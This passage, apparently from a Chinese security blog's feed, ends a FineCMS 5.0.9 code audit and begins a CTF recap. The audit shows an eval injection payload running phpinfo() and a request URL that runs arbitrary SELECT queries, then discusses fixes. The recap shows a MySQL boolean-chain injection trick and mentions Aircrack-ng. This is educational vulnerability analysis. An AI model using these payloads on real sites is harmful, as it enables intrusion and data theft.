class="hljs-string">&#x27;;&#x27;</span>);<br></code></pre></td></tr></table></figure><p>中，定位一下”_get_var()函数”</p><p>在/finecms/dayrui/libraries/Template.php第1570行<br>​    </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_get_var</span>(<span class="hljs-params"><span class="hljs-variable">$param</span></span>) </span>&#123;<br><span class="hljs-variable">$array</span> = explode(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-variable">$param</span>);<br><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$array</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$string</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$array</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$var</span>) &#123;<br>    <span class="hljs-variable">$string</span>.= <span class="hljs-string">&#x27;[&#x27;</span>;<br>    <span class="hljs-keyword">if</span> (strpos(<span class="hljs-variable">$var</span>, <span class="hljs-string">&#x27;$&#x27;</span>) === <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-variable">$string</span>.= preg_replace(<span class="hljs-string">&#x27;/\[(.+)\]/U&#x27;</span>, <span class="hljs-string">&#x27;[\&#x27;\\1\&#x27;]&#x27;</span>, <span class="hljs-variable">$var</span>);<br>    &#125; <span class="hljs-keyword">elseif</span> (preg_match(<span class="hljs-string">&#x27;/[A-Z_]+/&#x27;</span>, <span class="hljs-variable">$var</span>)) &#123;<br>        <span class="hljs-variable">$string</span>.= <span class="hljs-string">&#x27;&#x27;</span> . <span class="hljs-variable">$var</span> . <span class="hljs-string">&#x27;&#x27;</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$string</span>.= <span class="hljs-string">&#x27;\&#x27;&#x27;</span> . <span class="hljs-variable">$var</span> . <span class="hljs-string">&#x27;\&#x27;&#x27;</span>;<br>    &#125;<br>    <span class="hljs-variable">$string</span>.= <span class="hljs-string">&#x27;]&#x27;</span>;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-variable">$string</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>在这个函数中，如果传入的参数$param的开头是一个$,</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript"><span class="hljs-keyword">$string.= preg_replace</span>(&#x27;/<span class="hljs-symbol">\[</span>(.+)<span class="hljs-symbol">\]</span>/U&#x27;, &#x27;[<span class="hljs-symbol">\&#x27;</span><span class="hljs-symbol">\\</span>1<span class="hljs-symbol">\&#x27;</span>]&#x27;, <span class="hljs-keyword">$var);</span><br></code></pre></td></tr></table></figure><p>这一条语句将会把所有的”[(任意字符)]”替换成”[‘1’]”,如果不是$开头但是字符串中有大写字母A-Z或者_,则会给字符串两边加上空格，要是条件都不满足呢，给两边都加一个单引号’,最后两边分别加上[],payload最终返回的$string为</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs prolog">[<span class="hljs-string">&#x27;1&#x27;</span>];phpinfo();$asd=[<span class="hljs-string">&#x27;1&#x27;</span>]<br></code></pre></td></tr></table></figure><p>然后eval语句就成了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">@<span class="hljs-built_in">eval</span>(﻿<span class="hljs-variable">$data</span>=<span class="hljs-variable">$cache</span>[<span class="hljs-string">&#x27;1&#x27;</span>];phpinfo();<span class="hljs-variable">$asd</span>=[<span class="hljs-string">&#x27;1&#x27;</span>];)<br></code></pre></td></tr></table></figure><p>代码成功执行</p><h2 id="0x03-SQL语句执行漏洞演示-amp-剖析"><a href="#0x03-SQL语句执行漏洞演示-amp-剖析" class="headerlink" title="0x03 SQL语句执行漏洞演示&amp;剖析"></a>0x03 SQL语句执行漏洞演示&amp;剖析</h2><h3 id="漏洞演示-2"><a href="#漏洞演示-2" class="headerlink" title="漏洞演示"></a>漏洞演示</h3><p>payload:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">index</span>.php?c=api&amp;m=data<span class="hljs-number">2</span>&amp;auth=<span class="hljs-number">50</span>ce<span class="hljs-number">0</span>d<span class="hljs-number">2401</span>ce<span class="hljs-number">4802751739552</span>c<span class="hljs-number">8</span>e<span class="hljs-number">4467</span>&amp;param=action=sql%<span class="hljs-number">20</span>sql=&#x27;select%<span class="hljs-number">20</span>user();&#x27;<br></code></pre></td></tr></table></figure><p>执行效果</p><p><img src="https://image.mengsec.com/fincms-5.0.9-9.png"></p><h3 id="漏洞原理剖析-2"><a href="#漏洞原理剖析-2" class="headerlink" title="漏洞原理剖析"></a>漏洞原理剖析</h3><p>与代码执行漏洞相似，传入的参数进入data2()函数，接着传入了/finecms/dayrui/libraries/Template.php中的list_tag()函数中，经过提取action后传入switch-case语句中的sql部分(732-795行)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;sql&#x27;</span>: <span class="hljs-comment">// 直接sql查询</span><br><span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/sql=\&#x27;(.+)\&#x27;/sU&#x27;</span>, <span class="hljs-variable">$_params</span>, <span class="hljs-variable">$sql</span>)) &#123;<br>    <span class="hljs-comment">// 数据源的选择</span><br>    <span class="hljs-variable">$db</span> = <span class="hljs-keyword">$this</span>-&gt;ci-&gt;db;<br>    <span class="hljs-comment">// 替换前缀</span><br>    <span class="hljs-variable">$sql</span> = str_replace(<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;@#S&#x27;</span>, <span class="hljs-string">&#x27;@#&#x27;</span>), <span class="hljs-keyword">array</span>(<span class="hljs-variable">$db</span>-&gt;dbprefix . <span class="hljs-variable">$system</span>[<span class="hljs-string">&#x27;site&#x27;</span>], <span class="hljs-variable">$db</span>-&gt;dbprefix), trim(urldecode(<span class="hljs-variable">$sql</span>[<span class="hljs-number">1</span>])));<br>    <span class="hljs-keyword">if</span> (stripos(<span class="hljs-variable">$sql</span>, <span class="hljs-string">&#x27;SELECT&#x27;</span>) !== <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;_return(<span class="hljs-variable">$system</span>[<span class="hljs-string">&#x27;return&#x27;</span>], <span class="hljs-string">&#x27;SQL语句只能是SELECT查询语句&#x27;</span>);<br>    &#125;<br>    <span class="hljs-variable">$total</span> = <span class="hljs-number">0</span>;<br>    <span class="hljs-variable">$pages</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-comment">// 如存在分页条件才进行分页查询</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$system</span>[<span class="hljs-string">&#x27;page&#x27;</span>] &amp;&amp; <span class="hljs-variable">$system</span>[<span class="hljs-string">&#x27;urlrule&#x27;</span>]) &#123;<br>        <span class="hljs-variable">$page</span> = max(<span class="hljs-number">1</span>, (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>]);<br>        <span class="hljs-variable">$row</span> = <span class="hljs-keyword">$this</span>-&gt;_query(preg_replace(<span class="hljs-string">&#x27;/select \* from/iUs&#x27;</span>, <span class="hljs-string">&#x27;SELECT count(*) as c FROM&#x27;</span>, <span class="hljs-variable">$sql</span>), <span class="hljs-variable">$system</span>[<span class="hljs-string">&#x27;site&#x27;</span>], <span class="hljs-variable">$system</span>[<span class="hljs-string">&#x27;cache&#x27;</span>], <span class="hljs-literal">FALSE</span>);<br>        <span class="hljs-variable">$total</span> = (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>        <span class="hljs-variable">$pagesize</span> = <span class="hljs-variable">$system</span>[<span class="hljs-string">&#x27;pagesize&#x27;</span>] ? <span class="hljs-variable">$system</span>[<span class="hljs-string">&#x27;pagesize&#x27;</span>] : <span class="hljs-number">10</span>;<br>        <span class="hljs-comment">// 没有数据时返回空</span><br>        <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$total</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;_return(<span class="hljs-variable">$system</span>[<span class="hljs-string">&#x27;return&#x27;</span>], <span class="hljs-string">&#x27;没有查询到内容&#x27;</span>, <span class="hljs-variable">$sql</span>, <span class="hljs-number">0</span>);<br>        &#125;<br>        <span class="hljs-variable">$sql</span>.= <span class="hljs-string">&#x27; LIMIT &#x27;</span> . <span class="hljs-variable">$pagesize</span> * (<span class="hljs-variable">$page</span> - <span class="hljs-number">1</span>) . <span class="hljs-string">&#x27;,&#x27;</span> . <span class="hljs-variable">$pagesize</span>;<br>        <span class="hljs-variable">$pages</span> = <span class="hljs-keyword">$this</span>-&gt;_get_pagination(str_replace(<span class="hljs-string">&#x27;[page]&#x27;</span>, <span class="hljs-string">&#x27;&#123;page&#125;&#x27;</span>, urldecode(<span class="hljs-variable">$system</span>[<span class="hljs-string">&#x27;urlrule&#x27;</span>])), <span class="hljs-variable">$pagesize</span>, <span class="hljs-variable">$total</span>);<br>    &#125;<br>    <span class="hljs-variable">$data</span> = <span class="hljs-keyword">$this</span>-&gt;_query(<span class="hljs-variable">$sql</span>, <span class="hljs-variable">$system</span>[<span class="hljs-string">&#x27;site&#x27;</span>], <span class="hljs-variable">$system</span>[<span class="hljs-string">&#x27;cache&#x27;</span>]);<br>    <span class="hljs-variable">$fields</span> = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$system</span>[<span class="hljs-string">&#x27;module&#x27;</span>]) &#123;<br>        <span class="hljs-variable">$fields</span> = <span class="hljs-keyword">$this</span>-&gt;ci-&gt;module[<span class="hljs-variable">$system</span>[<span class="hljs-string">&#x27;module&#x27;</span>]][<span class="hljs-string">&#x27;field&#x27;</span>]; <span class="hljs-comment">// 模型主表的字段</span><br>        <br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$fields</span>) &#123;<br>        <span class="hljs-comment">// 缓存查询结果</span><br>        <span class="hljs-variable">$name</span> = <span class="hljs-string">&#x27;list-action-sql-&#x27;</span> . md5(<span class="hljs-variable">$sql</span>);<br>        <span class="hljs-variable">$cache</span> = <span class="hljs-keyword">$this</span>-&gt;ci-&gt;get_cache_data(<span class="hljs-variable">$name</span>);<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$cache</span> &amp;&amp; is_array(<span class="hljs-variable">$data</span>)) &#123;<br>            <span class="hljs-comment">// 模型表的系统字段</span><br>            <span class="hljs-variable">$fields</span>[<span class="hljs-string">&#x27;inputtime&#x27;</span>] = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;fieldtype&#x27;</span> =&gt; <span class="hljs-string">&#x27;Date&#x27;</span>);<br>            <span class="hljs-variable">$fields</span>[<span class="hljs-string">&#x27;updatetime&#x27;</span>] = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;fieldtype&#x27;</span> =&gt; <span class="hljs-string">&#x27;Date&#x27;</span>);<br>            <span class="hljs-comment">// 格式化显示自定义字段内容</span><br>                <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$data</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$i</span> =&gt; <span class="hljs-variable">$t</span>) &#123;<br>                <span class="hljs-variable">$data</span>[<span class="hljs-variable">$i</span>] = <span class="hljs-keyword">$this</span>-&gt;ci-&gt;field_format_value(<span class="hljs-variable">$fields</span>, <span class="hljs-variable">$t</span>, <span class="hljs-number">1</span>);<br>            &#125;<br>            <span class="hljs-comment">//$cache = $this-&gt;ci-&gt;set_cache_data($name, $data, $system[&#x27;cache&#x27;]);</span><br>            <span class="hljs-variable">$cache</span> = <span class="hljs-variable">$system</span>[<span class="hljs-string">&#x27;cache&#x27;</span>] ? <span class="hljs-keyword">$this</span>-&gt;ci-&gt;set_cache_data(<span class="hljs-variable">$name</span>, <span class="hljs-variable">$data</span>, <span class="hljs-variable">$system</span>[<span class="hljs-string">&#x27;cache&#x27;</span>]) : <span class="hljs-variable">$data</span>;<br>        &#125;<br>        <span class="hljs-variable">$data</span> = <span class="hljs-variable">$cache</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;_return(<span class="hljs-variable">$system</span>[<span class="hljs-string">&#x27;return&#x27;</span>], <span class="hljs-variable">$data</span>, <span class="hljs-variable">$sql</span>, <span class="hljs-variable">$total</span>, <span class="hljs-variable">$pages</span>, <span class="hljs-variable">$pagesize</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;_return(<span class="hljs-variable">$system</span>[<span class="hljs-string">&#x27;return&#x27;</span>], <span class="hljs-string">&#x27;参数不正确，SQL语句必须用单引号包起来&#x27;</span>); <span class="hljs-comment">// 没有查询到内容</span><br>    <br>&#125;<br><span class="hljs-keyword">break</span>;<br></code></pre></td></tr></table></figure><p>使用一个简单的正则将sql语句从传入的变量$_params中提取出来，$sql的内容变成了单引号之内的，也就是</p><pre><code>select user();</code></pre><p>此时$system为</p><pre><code>﻿Array ([oot] =&gt; [num] =&gt; [form] =&gt; [page] =&gt; [site] =&gt; 1 [flag] =&gt; [more] =&gt; [catid] =&gt; [field] =&gt; [order] =&gt; [space] =&gt; [table] =&gt; [join] =&gt; [on] =&gt; [cache] =&gt; 1110 [action] =&gt; sql [return] =&gt; [sbpage] =&gt; [module] =&gt; [modelid] =&gt; [keyword] =&gt; [urlrule] =&gt; [pagesize] =&gt; ) </code></pre><p>然后sql语句只是简单的判断了下是否为select开头(746-748行)<br>​    </p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs elixir">if (stripos(<span class="hljs-variable">$sql</span>, <span class="hljs-string">&#x27;SELECT&#x27;</span>) !== 0) &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-variable">$this</span>-&gt;_return(<span class="hljs-variable">$system</span>[<span class="hljs-string">&#x27;return&#x27;</span>], <span class="hljs-string">&#x27;SQL语句只能是SELECT查询语句&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>然后就进入了767行，数据查询函数中</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$data</span> = <span class="hljs-variable">$this</span>-&gt;_query(<span class="hljs-variable">$sql</span>, <span class="hljs-variable">$system</span>[<span class="hljs-string">&#x27;site&#x27;</span>], <span class="hljs-variable">$system</span>[<span class="hljs-string">&#x27;cache&#x27;</span>]);<br></code></pre></td></tr></table></figure><p>定位一下”_query()”函数，在Template.php文件的1319-1346行，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_query</span>(<span class="hljs-params"><span class="hljs-variable">$sql</span>, <span class="hljs-variable">$site</span>, <span class="hljs-variable">$cache</span>, <span class="hljs-variable">$all</span> = <span class="hljs-literal">TRUE</span></span>) </span>&#123;<br><br>    <span class="hljs-comment">// 数据库对象</span><br>    <span class="hljs-variable">$db</span> = <span class="hljs-variable">$site</span> ? <span class="hljs-keyword">$this</span>-&gt;ci-&gt;site[<span class="hljs-variable">$site</span>] : <span class="hljs-keyword">$this</span>-&gt;ci-&gt;db;<br>    <span class="hljs-variable">$cname</span> = md5(<span class="hljs-variable">$sql</span>.dr_now_url());<br>    <span class="hljs-comment">// 缓存存在时读取缓存文件</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$cache</span> &amp;&amp; <span class="hljs-variable">$data</span> = <span class="hljs-keyword">$this</span>-&gt;ci-&gt;get_cache_data(<span class="hljs-variable">$cname</span>)) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$data</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// 执行SQL</span><br>    <span class="hljs-variable">$db</span>-&gt;db_debug = <span class="hljs-literal">FALSE</span>;<br>    <span class="hljs-variable">$query</span> = <span class="hljs-variable">$db</span>-&gt;query(<span class="hljs-variable">$sql</span>);<br><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$query</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;SQL查询解析不正确：&#x27;</span>.<span class="hljs-variable">$sql</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// 查询结果</span><br>    <span class="hljs-variable">$data</span> = <span class="hljs-variable">$all</span> ? <span class="hljs-variable">$query</span>-&gt;result_array() : <span class="hljs-variable">$query</span>-&gt;row_array();<br><br>    <span class="hljs-comment">// 开启缓存时，重新存储缓存数据</span><br>    <span class="hljs-variable">$cache</span> &amp;&amp; <span class="hljs-keyword">$this</span>-&gt;ci-&gt;set_cache_data(<span class="hljs-variable">$cname</span>, <span class="hljs-variable">$data</span>, <span class="hljs-variable">$cache</span>);<br><br>    <span class="hljs-variable">$db</span>-&gt;db_debug = <span class="hljs-literal">TRUE</span>;<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$data</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到$sql直接进入了系统函数进行了数据查询。</p><h2 id="0x04-漏洞修补方案"><a href="#0x04-漏洞修补方案" class="headerlink" title="0x04 漏洞修补方案"></a>0x04 漏洞修补方案</h2><h3 id="1-文件上传漏洞的修补方案"><a href="#1-文件上传漏洞的修补方案" class="headerlink" title="1. 文件上传漏洞的修补方案"></a>1. 文件上传漏洞的修补方案</h3><p>漏洞产生的主要原因是因为开发者将获取的新文件的扩展名没有添加任何验证就将其拼接到了文件名称上，可以添加一个白名单验证。只允许允许上传的文件类型的扩展名上传。</p><h3 id="2-代码执行和sql语句执行漏洞的修补方案"><a href="#2-代码执行和sql语句执行漏洞的修补方案" class="headerlink" title="2. 代码执行和sql语句执行漏洞的修补方案"></a>2. 代码执行和sql语句执行漏洞的修补方案</h3><p>看这两个漏洞呢，都出现在Api.php的data2()函数中，其中的安全措施——安全码认证很容易就能获得，如果不能获得的话，那么这个漏洞后续的操作就不会被触发，我觉得可以修改cookie等需要调用安全码认证的地方，只让其获取一部分。或者让安全码不会被用户看到，验证阶段对于用户来说是一个黑箱子。</p><h3 id="3-对比5-0-11版本，查看官方解决方案"><a href="#3-对比5-0-11版本，查看官方解决方案" class="headerlink" title="3. 对比5.0.11版本，查看官方解决方案"></a>3. 对比5.0.11版本，查看官方解决方案</h3><p>5.0.11版本中</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-keyword">if</span> (!in_array(strtolower(<span class="hljs-variable">$result</span>[<span class="hljs-number">2</span>]), array(<span class="hljs-string">&#x27;jpg&#x27;</span>, <span class="hljs-string">&#x27;jpeg&#x27;</span>, <span class="hljs-string">&#x27;png&#x27;</span>, <span class="hljs-string">&#x27;gif&#x27;</span>))) &#123;<br>        <span class="hljs-keyword">exit</span>(dr_json(<span class="hljs-number">0</span>, <span class="hljs-string">&#x27;目录权限不足&#x27;</span>));<br>    &#125;<br></code></pre></td></tr></table></figure><p>加入了白名单</p><p>在5.0.11版本的finecms\dayrui\config\config.php文件中</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">$config[<span class="hljs-string">&#x27;sess_cookie_name&#x27;</span>]= md5(<span class="hljs-keyword">substr</span>($site[<span class="hljs-string">&#x27;SYS_KEY&#x27;</span>],<span class="hljs-number">0</span>, <span class="hljs-number">5</span>)).<span class="hljs-string">&#x27;_ci_session&#x27;</span>;<br></code></pre></td></tr></table></figure><p>相比较5.0.9版本直接获取SYS_KEY的值更安全了</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-symbol">$co</span>nfig[<span class="hljs-string">&#x27;sess_cookie_name&#x27;</span>]= <span class="hljs-symbol">$site</span>[<span class="hljs-string">&#x27;SYS_KEY&#x27;</span>].<span class="hljs-string">&#x27;_ci_session&#x27;</span>;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>代码审计</tag>
      
      <tag>SQL注入</tag>
      
      <tag>命令执行</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>火种CTF总结</title>
    <link href="/2017/09/10/%E7%81%AB%E7%A7%8DCTF%E6%80%BB%E7%BB%93/"/>
    <url>/2017/09/10/%E7%81%AB%E7%A7%8DCTF%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h2 id="0x01-Web"><a href="#0x01-Web" class="headerlink" title="0x01 Web"></a>0x01 Web</h2><p>印象最深刻的就是最后一道Web题，这道题是校赛的一个sql注入题改的，遗憾的是，在大表哥的提示后，我也没能做出来。但是Get到了SQL注入的一个新姿势：</p><a id="more"></a><p>正常查询：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">mysql&gt; select * from test where id = 1;<br><span class="hljs-code">+----+</span>------<span class="hljs-code">+------+</span><br>| Id | QAQ  | QAQ1 |<br><span class="hljs-code">+----+</span>------<span class="hljs-code">+------+</span><br>|  1 | 123  | 233  |<br><span class="hljs-code">+----+</span>------<span class="hljs-code">+------+</span><br>1 row in set (0.00 sec)<br></code></pre></td></tr></table></figure><p>错误查询：</p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">mysql&gt; <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> test <span class="hljs-keyword">where</span> id = -<span class="hljs-number">1</span>;<br><span class="hljs-keyword">Empty</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.00</span> sec)<br></code></pre></td></tr></table></figure><p>非正常查询：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">mysql&gt; select * from test where id = -1=(0)=1;<br><span class="hljs-code">+----+</span>------<span class="hljs-code">+------+</span><br>| Id | QAQ  | QAQ1 |<br><span class="hljs-code">+----+</span>------<span class="hljs-code">+------+</span><br>|  1 | 123  | 233  |<br><span class="hljs-code">+----+</span>------<span class="hljs-code">+------+</span><br>1 row in set (0.00 sec)<br></code></pre></td></tr></table></figure><p>这个语句很容易理解，首先是</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">select * <span class="hljs-keyword">from</span> test <span class="hljs-keyword">where</span> <span class="hljs-built_in">id</span> = <span class="hljs-number">-1</span><br></code></pre></td></tr></table></figure><p>这句话为假，即它的值为0，但是0 = 0，就成立了，成真，所以</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">select * <span class="hljs-keyword">from</span> test <span class="hljs-keyword">where</span> <span class="hljs-built_in">id</span> = <span class="hljs-number">-1</span>=(<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><p>的值为真，即为1，1=1成立，因此该句成立，从而返回查询结果。<br>与之类似</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">mysql&gt; select * from test where id =-1=(1)=0;<br><span class="hljs-code">+----+</span>------<span class="hljs-code">+------+</span><br>| Id | QAQ  | QAQ1 |<br><span class="hljs-code">+----+</span>------<span class="hljs-code">+------+</span><br>|  1 | 123  | 233  |<br><span class="hljs-code">+----+</span>------<span class="hljs-code">+------+</span><br>1 row in set (0.00 sec)<br></code></pre></td></tr></table></figure><p>甚至不等号”&lt;&gt;”,都可以。</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">mysql&gt; select * from test where id =-1&lt;&gt;(1)&lt;&gt;0;<br><span class="hljs-code">+----+</span>------<span class="hljs-code">+------+</span><br>| Id | QAQ  | QAQ1 |<br><span class="hljs-code">+----+</span>------<span class="hljs-code">+------+</span><br>|  1 | 123  | 233  |<br><span class="hljs-code">+----+</span>------<span class="hljs-code">+------+</span><br>1 row in set (0.00 sec)<br></code></pre></td></tr></table></figure><p>中间的语句可以用来构造Bool条件。<br>SQL语句实在是太灵活了，感觉是，只有想不到，没有做不到。。</p><h2 id="0x02-Misc"><a href="#0x02-Misc" class="headerlink" title="0x02 Misc"></a>0x02 Misc</h2><p>杂项不愧是杂项，每次做题总能遇到没见过的。</p><ol><li>Thumbs.db文件<blockquote><p>Thumbs.db是一个用于Microsoft Windows XP或mac os x缓存Windows Explorer的缩略图的文件。</p></blockquote></li></ol><p>这个题目给了一堆关于海贼王的图片，里面还有一个Thumbs.db文件，百度下载thumbs_viewer，可以打开该文件，然后获得两个图片，其中一个图片的原图是有问题的，直接Notepad++打开搜索字符串，获得Flag.</p><p>2..ivs文件<br>这种文件可用来破解wifi密码。</p><p>这个题目给了一个<a href="http://www.ivs文件和一个带密码的压缩包，推测通过www.ivs文件获取压缩包密码，使用Aircrack-ng软件打开.ivs文件：">www.ivs文件和一个带密码的压缩包，推测通过www.ivs文件获取压缩包密码，使用Aircrack-ng软件打开.ivs文件：</a></p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">cygwin warning:<br>  MS-DOS style path detected: E:<span class="hljs-symbol">\C</span>TF<span class="hljs-symbol">\\</span>xE6<span class="hljs-symbol">\x</span>AF<span class="hljs-symbol">\x</span>94<span class="hljs-symbol">\x</span>E8<span class="hljs-symbol">\x</span>B5<span class="hljs-symbol">\x</span>9B<span class="hljs-symbol">\\</span>xE7<span class="hljs-symbol">\x</span>81<span class="hljs-symbol">\x</span>AB<span class="hljs-symbol">\x</span>E7<span 